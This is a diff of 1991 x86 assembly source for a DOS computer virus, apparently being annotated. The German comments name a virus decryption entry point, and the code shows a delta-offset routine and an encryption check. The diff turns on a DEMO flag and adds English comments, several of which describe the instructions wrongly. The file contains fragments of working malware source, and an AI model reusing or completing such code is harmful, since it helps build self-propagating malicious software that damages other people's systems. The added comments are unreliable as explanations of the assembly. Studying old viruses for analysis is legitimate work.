@@ -10,7 +10,7 @@ FALSE           EQU     0
 MONTH           EQU     9D
 YEAR            EQU     1991D
 
-DEMO            EQU     FALSE
+DEMO            EQU     TRUE
 
 SWITCHABLE      =       TRUE
 IFDEF           _NOSWITCH
@@ -24,24 +24,24 @@ Wait_HRI_or_VRI MACRO                                   ;
 		LOCAL   _X_1, _X_2, _X_3                ;
 		MOV     DX,03DA                         ; send data from segment register. Address CGA status port, colors
 		CLI                                     ; clear flag
-	  _X_1: IN      AL,DX                           ;
-		TEST    AL,08                           ;
-		JNZ     _X_3                            ;
-		TEST    AL,01                           ;
+	  _X_1: IN      AL,DX                           ; store on primary accum
+		TEST    AL,08                           ; AND 
+		JNZ     _X_3                            ; jump if not zero ZF
+		TEST    AL,01                           ; AND 01
 		JNZ     _X_1                            ;
 	  _X_2: IN      AL,DX                           ;
 		TEST    AL,01                           ;
-		JZ      _X_2                            ;
-	  _X_3  LABEL   NEAR                            ;
+		JZ      _X_2                            ; jump if zero
+	  _X_3  LABEL   NEAR                            ; same, var and type, no allocation
 		ENDM                                    ;------;
 
 SAVE            MACRO     _1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c  ;
 		 FOR  _X,<_1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c> ;
 		  IFNB   <_X>                           ;------;
 		   IFIDN <_X>,<F>                  ;
-			PUSHF                           ;
+			PUSHF                           ; pushes lower 16 to Eflag
 		   ELSE                                 ;
-			PUSH    _X                      ;
+			PUSH    _X                      ; push data on stack
 		   ENDIF                                ;
 		  ENDIF                                 ;
 		 ENDM                                   ;
@@ -50,9 +50,9 @@ REST            MACRO     _1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c  ;
 		 FOR  _X,<_1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c> ;
 		  IFNB   <_X>                           ;------;
 		   IFIDN <_X>,<F>                  ;
-			POPF                            ;
+			POPF                            ; pop from flag 
 		   ELSE                                 ;
-			POP     _X                      ;
+			POP     _X                      ; pop into x register
 		   ENDIF                                ;
 		  ENDIF                                 ;
 		 ENDM                                   ;
@@ -135,18 +135,19 @@ PSP_102         EQU     THIS BYTE + PSPsize + 2         ;
 									      ?
 	Ab hier wird Objektcode erzeugt, Datenbereich Nr. 1.                    
 										
-		#                                       ;
+		#                                       ;byte
 Crypt1          DB      0                               ;
 Crypt2          EQU     OFFSET Crypt1 + FIRSTBASE       ;
 Crypt3          EQU     Crypt1 + PSPsize                ;
 		comment                                 #
 									      ?
 	Einsprungstelle, entschl sseln des Virus falls notwendig.               
+	Decrypt
 										
 		#                                       ;
 XI_000:         CLI                                     ;
-		MOV     BP,SP                           ;
-		CALL    XI_001                          ;
+		MOV     BP,SP                           ;stack pointer to base pointer
+		CALL    XI_001                          ;call
 XI_001:         POP     BX                              ;
 		SUB     BX,FIRSTCONST                   ;
 		TEST    BYTE PTR CS:[BX+Crypt2],EnCrptd ;
